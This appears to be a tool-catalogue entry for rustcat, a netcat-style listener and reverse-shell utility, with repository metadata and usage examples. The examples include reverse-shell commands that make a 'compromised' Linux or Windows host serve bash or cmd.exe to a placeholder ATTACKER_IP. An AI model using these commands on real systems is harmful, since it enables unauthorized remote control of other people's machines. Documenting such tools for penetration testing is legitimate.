---
name: "rustcat"
categories:
  - blackarch-networking
version: "v3.0.0.r4.g245c791"
homepage: "https://github.com/robiot/rustcat"
packaged-by: [blackarch, aur, nixpkgs]
blackarch-builddate: "2022-10-30"
build-system: go
license: MIT
meta-checked: "2026-11-09"
github-repo: "robiot/rustcat"
github-stars: 820
github-pushed: "2024-07-20"
github-archived: false
github-issues: 4
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.7
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# rustcat

> Modern netcat-style port listener and reverse shell with a friendly interactive mode.

## What it's for

Rustcat (`rcat`, by robiot) is a Rust replacement for the listener/connect side of netcat: it listens on a port or connects back to one, with built-in command history, tab completion, Ctrl-C blocking and colors. Its two verbs cover the common red-team plumbing — `rcat listen` to catch connections (including reverse shells) and `rcat connect -s <shell>` to serve an interactive shell over a connection on Linux or Windows. It deliberately stays simple rather than growing netcat's full swiss-army feature set.

## Typical use cases

### Listen on a port interactively

Open a listener you can drive comfortably from the terminal.

```
rcat listen -ib 55600
```

Outcome: binds TCP port 55600 and attaches an interactive session (command history, tab completion, Ctrl-C ignored) to whatever connects — a plain netcat on the far end is enough to exchange data, and full-screen programs like vim survive the session.

### Catch a reverse shell from a Linux target

Get an interactive shell back from a compromised host.

```
rcat listen -ib 55600
rcat connect -s bash ATTACKER_IP 55600
```

Outcome: the first command runs on the attacker box and waits; running the second on the target connects back to ATTACKER_IP and serves a bash shell over the link, landing in the attacker's interactive listener.

### Catch a reverse shell from a Windows target

Same pattern with cmd.exe as the served shell.

```
rcat connect -s cmd.exe ATTACKER_IP 55600
```

Outcome: the Windows host connects back to the listener on port 55600 and executes cmd.exe over the connection.

*No corpus evidence — derived from upstream documentation.*
